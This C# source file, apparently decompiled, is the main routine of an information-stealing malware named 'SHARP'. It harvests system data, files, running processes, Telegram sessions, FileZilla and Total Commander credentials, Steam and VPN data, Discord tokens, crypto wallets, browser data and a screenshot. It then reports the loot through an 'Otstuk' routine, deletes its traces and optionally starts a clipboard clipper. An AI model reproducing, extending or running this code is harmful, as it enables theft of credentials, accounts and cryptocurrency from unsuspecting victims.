using System;
using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Program
    {
      private static async Task Main()
      {
        try
        {
          string ExDir = Help.ExploitDir;
          Help.Start();
          Directory.CreateDirectory(Help.ExploitDir);
          await IP.ip();
          Help.checkSNG();
          await Task.Run((Func<Task>) (async () => await SystemInfo.GetSystem(ExDir)));
          await Task.Run((Func<Task>) (async () => await Files.GetFiles(ExDir)));
          await Task.Run((Func<Task>) (async () => await ProcessList.WriteProcesses(ExDir)));
          await Task.Run((Func<Task>) (async () => await Telegram.GetTelegramSessions(ExDir)));
          await Task.Run((Func<Task>) (async () => await FileZilla.GetFileZilla(ExDir)));
          await Task.Run((Func<Task>) (async () => await TotalCommander.Start(ExDir)));
          await Task.Run((Func<Task>) (async () => await Steam.SteamGet(ExDir)));
          await Task.Run((Func<Task>) (async () => await StartVPN.Start(ExDir)));
          await Task.Run((Func<Task>) (async () => await Discord.Run(ExDir)));
          await Task.Run((Func<Task>) (async () => await StartWallets.Start()));
          await Task.Run((Func<Task>) (async () => await Browsers.ChromiumBrowsers()));
          await Task.Run((Func<Task>) (async () => await Browsers.GeckoBrowsers()));
          await Task.Run((Func<Task>) (async () => await Screenchik.GetScreen(ExDir)));
          try
          {
            await Otstuk.Run(Config.method);
            Program.Finish();
          }
          catch (Exception ex)
          {
            Program.Finish();
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
          Program.Finish();
        }
      }

      private static void Finish()
      {
        if (Config.cclipper)
        {
          Directory.Delete(Help.ExploitDir + "\\", true);
          Directory.Delete(Help.dir + "\\", true);
          Help.Stop();
          Monitor.run();
        }
        else
        {
          Directory.Delete(Help.ExploitDir + "\\", true);
          Directory.Delete(Help.dir + "\\", true);
          Help.Stop();
          Environment.Exit(0);
        }
      }
    }
}
